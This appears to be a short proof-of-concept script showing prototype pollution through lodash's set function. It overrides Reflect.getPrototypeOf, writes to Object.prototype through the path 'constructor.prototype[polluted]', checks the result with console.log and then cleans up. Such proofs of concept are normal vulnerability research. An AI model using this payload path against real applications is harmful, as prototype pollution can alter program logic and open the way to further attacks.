Reflect.getPrototypeOf = () => false;
const lod = require('lodash');
let obj = {};
console.log({}.polluted);
lod.set(obj, 'constructor.prototype[polluted]', 'yes');
console.log({}.polluted);
delete obj.__proto__.polluted;